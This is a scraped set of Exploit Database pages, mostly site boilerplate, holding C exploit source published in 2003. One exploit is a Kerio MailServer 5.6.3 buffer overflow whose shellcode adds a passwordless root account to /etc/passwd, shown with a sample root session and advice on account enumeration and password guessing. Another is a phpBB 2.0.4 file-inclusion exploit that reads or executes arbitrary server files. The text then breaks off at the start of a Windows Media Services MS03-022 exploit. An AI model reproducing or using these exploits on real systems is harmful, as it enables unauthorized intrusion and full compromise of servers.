case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 46
Kerio MailServer 5.6.3 - Remote Buffer Overflow - Linux remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDKerio MailServer 5.6.3 - Remote Buffer OverflowEDB-ID:46CVE:2003-0487EDB Verified:Author:B-r00tType:remoteExploit:/Platform:LinuxDate:2003-06-27Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* Remote Buffer Overflow Exploit for Kerio MailServer 5.6.3   *//* ========================================= *//*	                        By B-r00t                                  *//*				                       *//* In response to the Kerio Mailserver vulnerabilities              *//* discovered by David F.Madrid.			       *//*	                                                                       *//* Although this exploit requires valid authentication	       *//* details, it is possible to use 'RCPT TO' to enumerate         *//* valid accounts 'A La Sendmail' as shown below: -	       *//*$ telnet 192.168.0.10 25Trying 192.168.0.10...Connected to 192.168.0.10.Escape character is '^]'.220 dhcp-185-45 Kerio MailServer 5.6.3 ESMTP readymail from: Br00t@host.net250 2.1.0 Sender <Br00t@host.net> okrcpt to: nosuchuser@host.net550 5.1.1 Mailbox <nosuchuser@host.net> does not existrcpt to:admin@host.net250 2.1.5 Recipient <admin@host.net> ok (local) << defaultadmin account.rcpt to: fred@host.net250 2.1.5 Recipient <fred@host.net> ok (local) << user fredseems to exist.rset250 2.0.0 Reset statequit221 2.0.0 SMTP closing connectionConnection closed by foreign host.*//* Using a dictionary attack to obtain a large number      *//* of accounts in conjunction with users  natural              *//* stupidity for using easy to guess passwords should	*//* yield at least one valid account.		*//*					*//* Once an account has been cracked, login to the	*//* Kerio webmail service and record the 'userid' 	*//* cookie value: -				*//*$ lynx 192.168.0.10Username: fred___________Password: _______________OK192.168.0.10 cookie: userid=7dc1700017e708a5  Allow? (Y/N/Always/neVer)*//* Accept the cookie 'Y' to ensure you are fully	*//* logged in to the Kerio webmail service.		*//*[br00t@silvia:~] $ ./keriobaby 192.168.0.10 userid=7dc1700017e708a5Payload: 408 / 408 bytesWall0p! ... !!!If successful a UID 0 Account 'keriohacker'has been appended to /etc/passwd. Use 'ssh'or 'su' (if local) to get r00t! ....[br00t@silvia:~] $ ssh -l keriohacker 192.168.0.10Last login: Thu Jun  5 08:21:30 2003sh-2.05# iduid=0(root) gid=0(root) groups=0(root)sh-2.05# tail -1 /etc/passwdkeriohacker::0:0:B-r00t~R0x~Y3r~W0rld!.:/tmp:/bin/shsh-2.05#*SSH assumes: PermitRootLogin yes & PermitEmptyPasswords yesAlternative: Recode the shellcode to add normal user!That's All Folks ...ENJOY!*/#include <stdlib.h>#include <stdio.h>#include <string.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#define DEST_PORT 80int main ( int argc, char *argv[] ){int socketfd, bytes;struct sockaddr_in dest_addr;char buffer[700];// char ret[] = "\x07\xf7\x7f\xbe"; // Use this if attached with GDBchar ret[] = "\x07\xf7\xff\xbe"; // RedHat Linux 7.2 +kerio-mailserver-mcafee-5.6.3-rh7.i386.rpmchar *ptr = buffer;char req[] = "GET /list?folder=~";char cr[] = "\x0D\x0A";char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"// Fat Bloke Shellcode to avoid HTTP chars by B-r00t..// Appends: keriohacker::0:0:B-r00t~R0x~Y3r~W0rld!.:/tmp:/bin/sh"\xeb\x55\x5e\xb0\xff\x2c\xd0\x88\x06\x88\x46\x04\x88\x46\x34""\x88\x46\x39\x88\x46\x3d\x31\xc0\x88\x46\x0b\x88\x46\x41\x66""\xb8\x0b\x27\x66\x2d\x01\x27\x66\x89\x46\x40\x8d\x5e\x0c\x89""\x5e\x42\xb0\x05\x8d\x1e\x66\xb9\x42\x04\x66\xba\xe4\x01\xcd""\x80\x89\xc3\xb0\x04\x8b\x4e\x42\x31\xd2\xb2\xff\x80\xea\xca""\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xa6\xff""\xff\xff\x58\x65\x74\x63\x58\x70\x61\x73\x73\x77\x64\x58\x6b""\x65\x72\x69\x6f\x68\x61\x63\x6b\x65\x72\x3a\x3a\x30\x3a\x30""\x3a\x42\x2d\x72\x30\x30\x74\x7e\x52\x30\x78\x7e\x59\x33\x72""\x7e\x57\x30\x72\x6c\x64\x21\x2e\x3a\x58\x74\x6d\x70\x3a\x58""\x62\x69\x6e\x58\x73\x68\x58\x58\x41\x41\x41\x41""\x90\x90\x90\x90\x90\x90";memset (buffer, '\0', sizeof (buffer));if (argc < 3) {printf("\nUsage: %s [IP_ADDRESS] [COOKIE]", argv[0]);printf("\nExample: %s 10.0.0.1 userid=771c740df0270936\n",argv[0]);exit (1);}printf ("\nPayload: %d / 408 bytes\n\n", strlen(shellcode));strcpy (buffer, req);strcat (buffer, shellcode);strcat (buffer, ret);strcat (buffer, ret);strcat (buffer, " HTTP/1.0");strcat (buffer, cr);strcat (buffer, "Cookie: ");strcat (buffer, argv[2]);strcat (buffer, cr);strcat (buffer, cr);if ((socketfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){perror("Socket");exit (1);}dest_addr.sin_family = AF_INET;dest_addr.sin_port = htons(DEST_PORT);if (! inet_aton(argv[1], &(dest_addr.sin_addr))) {perror("inet_aton problems");exit (2);}memset( &(dest_addr.sin_zero), '\0', 8);if (connect (socketfd, (struct sockaddr *)&dest_addr, sizeof (structsockaddr)) == -1){perror("connect failed");close (socketfd);exit (3);}bytes = (send (socketfd, ptr, strlen(buffer), 0));if (bytes == -1) {perror("send error");close (socketfd);exit(4);}close (socketfd);printf ("\nWall0p! ... !!!\n\n");printf ("\nIf successful a UID 0 Account 'keriohacker'");printf ("\nhas been appended to /etc/passwd. Use 'ssh'");printf ("\nor 'su' (if local) to get r00t! ....\n\n");}// milw0rm.com [2003-06-27]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 47
phpBB 2.0.4 - PHP Remote File Inclusion - PHP webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDphpBB 2.0.4 - PHP Remote File InclusionEDB-ID:47CVE:EDB Verified:Author:SpoofedType:webappsExploit:/Platform:PHPDate:2003-06-30Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED/***********************************************************//* phpBB 2.0.4 Remote Admin_Styles.PHP Theme_Info.CFG File Include  *//*                                                                                                    *//*                Exploit made on June 2003 by Spoofed Existence               *//*                                                                                                    *//*       Patch : http://www.phpbb.com/phpBB/viewtopic.php?t=113826      *//***********************************************************/#include <stdio.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <netdb.h>int main(){//The socket stuffstruct hostent *hp;struct sockaddr_in sa;int sock;//The input stuffchar server[100];char location[100];char sfile[100];int escapes;char* file;//The request stuffchar* request;char* postdata;char* header;//The buffer to store the responsechar buffer[4096];int tworeturns = 0;int showing = 0;//Otherint i;//Ask the serverprintf("Server: ");scanf("%100s", server);printf("Forum location: ");scanf("%100s", location);printf("Directories to escape: ");scanf("%i", &escapes);printf("File to get/execute: ");scanf("%100s", sfile);//Start the exploit!printf("\n\nStarting the exploit...\n");//Connect to the serverprintf("Creating socket... ");if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0){printf("Failed!\n");return 0;} else{ printf("Done!\n");}printf("Looking up server IP... ");if((hp = gethostbyname((char*)server)) == NULL){printf("Failed!\n");return 0;} else { printf("Done!\n");}printf("Connecting %s:80... ", server);memcpy(&sa.sin_addr, hp->h_addr_list[0], hp->h_length);sa.sin_family = AF_INET;sa.sin_port = htons(80);if(connect(sock, (struct sockaddr*)&sa, sizeof(sa))){printf("Failed!\n");return 0;} else { printf("Done!\n");}//Create the requestprintf("Building request... ");//Create the postdatafile = (char*)malloc(sizeof(char) * (escapes * 3 + strlen(sfile) + 1));while(escapes > 0){if(escapes == 1){sprintf(file, "%s%s%s", file, "..", sfile);} else { sprintf(file, "%s%s", file, "../");}escapes --;}postdata = (char*)malloc((27 + strlen(file)) * sizeof(char));sprintf(postdata, "send_file= &install_to=%s%s00", file, "%");header = (char*)malloc((170 + strlen(server) + strlen(location)) *sizeof(char));sprintf(header, "POST /%s/admin/admin_styles.php?mode=addnewHTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost:%s\r\nContent-Length: %i\r\nConnection: close\r\n\r\n", location, server,strlen(postdata));request = (char*)malloc((strlen(postdata) + strlen(header) + 1) *sizeof(char));sprintf(request, "%s%s", header, postdata);printf("Done!\n");//Send the requestprintf("Sending request... ");write(sock, request, strlen(request));printf("Done!\n");printf("\nResponse:\n");//Get the responsewhile(recv(sock, buffer, 4096, 0) != 0){for(i = 0; i < strlen(buffer); i++){//Only show the character when it shouldif(showing == 1){printf("%c", buffer[ i ]);}//Stop showing from \n<br>\nif(buffer[ i ] == '\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&buffer[i + 3] == 'r' && buffer[i + 4] == '>' && buffer[i + 5] == '\n' &&showing == 1){showing = 0;tworeturns = 0;}//Or from \n<br />\nif(buffer[ i ] == '\n' && buffer[i + 1] == '<' && buffer[i + 2] == 'b' &&buffer[i + 3] == 'r' && buffer[i + 4] == ' ' && buffer[i + 5] == '/' &&buffer[i + 6] == '>' && buffer[i + 7] == '\n' && showing == 1){showing = 0;tworeturns = 0;}//If there's a return and tworeturns = true, start showing itif(buffer[ i ] == '\n' && tworeturns == 1){showing = 1;}//If there are two returns, set tworeturns to true and add 3 to iif(buffer[ i ] == '\r' && buffer[i + 1] == '\n' && buffer[i + 2] == '\r'&& buffer[i + 3] == '\n'){tworeturns = 1;i += 3;}}}printf("\n");return 0;}// milw0rm.com [2003-06-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 48
Microsoft Windows Media Services - Remote (MS03-022) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Media Services - Remote (MS03-022)EDB-ID:48CVE:2003-0349EDB Verified:Author:firew0rkerType:remoteExploit:/Platform:WindowsDate:2003-07-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED// Windows Media Services Remote Command Execution #2// v. 1.0 beta// (c) firew0rker  //tN  [The N0b0D1eS]#include <stdio.h>#include <string.h>#include <stdlib.h>#ifdef WIN32#include <winsock.h>#pragma comment(lib, "wsock32")#else#include <sys/socket.h>#include <sys/types.h>#include <netinet/in.h>#include 